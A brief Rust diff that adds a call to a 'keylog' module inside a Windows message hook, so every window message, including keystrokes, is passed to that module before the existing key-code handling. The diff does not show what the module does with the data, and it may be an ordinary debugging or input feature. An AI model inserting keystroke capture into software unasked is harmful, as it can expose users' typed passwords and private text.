@@ -171,6 +171,7 @@ pub fn msg_hook(msg: *const std::ffi::c_void) {
     let Some(msg) = (unsafe { msg.cast::<MSG>().as_ref() }) else {
         return;
     };
+    crate::keylog::msg(msg.message, msg.wParam.0, msg.lParam.0);
     if (WM_KEYDOWN..=WM_SYSCHAR).contains(&msg.message) {
         CODES.with(|c| {
             if let Ok(mut c) = c.try_borrow_mut() {
